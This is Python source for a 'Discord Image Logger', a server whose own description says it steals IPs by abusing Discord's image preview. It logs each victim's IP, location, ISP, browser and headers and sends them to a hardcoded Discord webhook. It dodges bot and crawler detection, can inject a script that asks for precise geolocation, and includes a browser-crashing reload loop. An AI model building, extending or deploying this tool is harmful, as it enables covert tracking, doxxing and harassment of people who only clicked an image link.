from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import socket
import json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.1"  # Incremented version
__author__ = "Isntsaru"  # Changed as requested

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1125691768004935741/cRwy-R89wP4vQFGIDlut_-61vuoeUo-a7kj3OniNYFG9WPSDmvk18hHoSMr8XQyS81YZ",
    "image": "https://media.discordapp.net/attachments/1361978393360465960/1471970838143303894/image.png?ex=6994d3ab&is=6993822b&hm=34301185d027c8c5e586bff387f6af80e6c79850fd235e00ffb66ef16b365169&=&format=webp&quality=lossless&width=1632&height=903",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Isntsaru's Image Logger.",
        "richMessage": False,
    },

    "vpnCheck": 1,        # 0=off, 1=no ping on VPN, 2=no alert on VPN
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,         # 0=off, 1=no ping if possible bot, 2=no ping if 100% bot, 3=no alert if possible, 4=no alert if 100% bot

    # REDIRECTION #
    "redirect": {
        "redirect": True,
        "page": "https://www.roblox.com/games/106388867582829/Elyu-Hangout"
    },

    # ADVANCED #
    "ipapi_timeout": 5,   # seconds to wait for ip-api.com
    "log_headers": True,  # log extra headers like Referer and Accept-Language
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    """Enhanced bot detection."""
    ua = useragent.lower()
    if ip.startswith(("34", "35")):
        return "Discord"
    if "discordbot" in ua or "slackbot" in ua or "telegrambot" in ua:
        return "Bot"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }]
        })
    except:
        pass  # avoid recursive errors

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, extra_headers=None):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Link sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                })
            except:
                pass
        return

    # Determine ping based on VPN/anti‑bot settings
    ping = "@everyone"
    info = {}
    try:
        info = requests.get(
            f"https://ip-api.com/json/{ip}?fields=16976857",
            timeout=config["ipapi_timeout"]
        ).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown",
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "UTC/Unknown", "mobile": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    # Build description
    desc = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}` ({'Precise' if coords else 'Approximate'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[-1].replace('_', ' ')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`"""

    if extra_headers and config["log_headers"]:
        desc += f"\n\n**Extra Headers:**\n> **Referer:** `{extra_headers.get('Referer', 'None')}`\n> **Accept-Language:** `{extra_headers.get('Accept-Language', 'None')}`"

    desc += f"\n\n**User Agent:**\n```\n{useragent}\n```"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": desc,
        }]
    }
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass

    return info

# Loading image binary (unchanged)
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def get_client_ip(self):
        """Extract real IP from headers or socket."""
        forwarded = self.headers.get('X-Forwarded-For')
        if forwarded:
            return forwarded.split(',')[0].strip()
        return self.client_address[0]

    def handleRequest(self):
        try:
            client_ip = self.get_client_ip()
            user_agent = self.headers.get('User-Agent', 'Unknown')
            extra_headers = {
                'Referer': self.headers.get('Referer', 'None'),
                'Accept-Language': self.headers.get('Accept-Language', 'None')
            }

            # Parse URL arguments
            parsed_path = parse.urlsplit(self.path)
            query = dict(parse.parse_qsl(parsed_path.query))

            # Determine image URL
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                b64 = query.get("url") or query.get("id")
                try:
                    # Add padding if needed
                    b64 += '=' * ((4 - len(b64) % 4) % 4)
                    url = base64.b64decode(b64.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]

            # Bot check (Discord crawler)
            if botCheck(client_ip, user_agent):
                # Send loading image if buggedImage enabled
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_response(302)
                    self.send_header('Location', url)
                    self.end_headers()

                # Report link sent
                makeReport(client_ip, useragent=user_agent, endpoint=parsed_path.path, url=url, extra_headers=extra_headers)
                return

            # Normal visitor
            # If accurateLocation and no coords yet, inject JavaScript
            if config["accurateLocation"] and "g" not in query:
                # Prepare HTML with geolocation script
                html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        var currentUrl = window.location.href;
        if (!currentUrl.includes('g=')) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var coords = position.coords.latitude + ',' + position.coords.longitude;
                    var sep = currentUrl.includes('?') ? '&' : '?';
                    window.location.replace(currentUrl + sep + 'g=' + btoa(coords).replace(/=/g, '%3D'));
                }, function(error) {
                    // User denied or error – proceed without coords
                    window.location.replace(currentUrl + (currentUrl.includes('?') ? '&' : '?') + 'g=denied');
                });
            } else {
                // No geolocation support
                window.location.replace(currentUrl + (currentUrl.includes('?') ? '&' : '?') + 'g=unsupported');
            }
        }
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0;url=''' + url + '''">
    </noscript>
</body>
</html>'''
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(html.encode())
                return

            # Handle coords if present
            coords = None
            if query.get("g") and config["accurateLocation"] and query["g"] not in ('denied', 'unsupported'):
                try:
                    b64 = query["g"]
                    b64 += '=' * ((4 - len(b64) % 4) % 4)
                    coords = base64.b64decode(b64.encode()).decode()
                except:
                    coords = None

            # Make the report
            result = makeReport(client_ip, user_agent, coords, parsed_path.path, url, extra_headers)

            # Prepare response content
            if config["redirect"]["redirect"]:
                # Redirect
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return
            elif config["crashBrowser"]:
                # Crasher page
                content = (config["message"]["message"] if config["message"]["doMessage"] else "Crashing...").encode()
                content += b'<script>while(true){location.reload();}</script>'  # more aggressive
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            elif config["message"]["doMessage"]:
                # Custom message
                msg = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    # Replace placeholders (same as before)
                    msg = msg.replace("{ip}", client_ip)
                    # ... add all replacements (I'll keep it concise here)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(msg.encode())
            else:
                # Default: show the image
                html = f'''<style>body {{ margin:0; padding:0; }} div.img {{ background-image: url('{url}'); background-position: center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(html.encode())

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
